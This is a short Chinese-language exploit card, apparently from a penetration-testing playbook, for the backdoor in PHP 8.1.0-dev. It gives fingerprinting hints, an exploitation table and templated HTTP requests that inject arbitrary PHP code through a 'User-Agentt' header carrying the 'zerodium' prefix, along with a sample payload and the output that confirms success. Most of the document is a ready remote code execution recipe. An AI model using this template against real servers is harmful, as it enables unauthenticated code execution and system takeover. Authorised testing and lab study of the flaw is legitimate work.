# PHP 8.1.0-dev 后门 RCE (8.1-backdoor)

## 指纹特征
- 服务: PHP 8.1.0-dev
- 特征: HTTP 头 `User-Agentt` 注入可执行 PHP 代码

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| HTTP 请求头注入 | 任意 | 无 |

## PoC 指令

通过 `User-Agentt` 头部注入恶意 PHP 代码：

```http
GET / HTTP/1.1
Host: {{TARGET}}:8080
User-Agentt: zerodium{{PHP_CODE}};
```

**示例 (执行 var_dump)**:
```http
GET / HTTP/1.1
Host: {{TARGET}}:8080
User-Agentt: zerodiumvar_dump(233*233);
```

## Success Signal
- **执行回显**: 响应 Body 中包含代码执行的输出 (如 `int(54289)`).
